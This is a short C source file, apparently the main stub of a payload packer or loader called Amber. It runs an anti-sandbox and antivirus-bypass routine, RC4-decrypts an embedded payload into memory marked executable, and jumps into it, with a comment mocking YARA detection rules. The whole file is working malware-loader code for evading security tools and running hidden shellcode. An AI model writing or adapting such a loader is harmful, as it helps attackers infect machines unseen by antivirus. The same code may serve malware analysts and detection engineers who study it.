#include <windows.h>
#include "AntiSandbox.h"
#include "payload.h"
#include "key.h"
#include "RC4.h"

const char LABEL[] = {"<Amber:4ba34949430d0ee1840305b65eb905c8ac1bf0fe>"}; // Descriptive label for yara rules ;D
void ExecutePayload();


int main(int argc, char const *argv[])
{
	CreateThread(NULL,0,BypassAV,NULL,0,NULL);
	if(BypassAV(NULL)){
		ExecutePayload();
	}
	return 0;
}

void ExecutePayload(){

/*
	for(int i = 0; i < sizeof(Payload); i++) {
		Payload[i] = (Payload[i] ^ Payload_key[(i%sizeof(Payload_key))]);
	}	
*/

	unsigned char S[N];
    KSA(Payload_key,Payload_key_len,S);	
	unsigned char* BUFFER = (unsigned char*)VirtualAlloc(NULL, Payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PRGA(S,Payload,Payload_len,BUFFER);
	(*(void(*)())BUFFER)();
	
	while(true){
		Sleep(1000);
	}
}


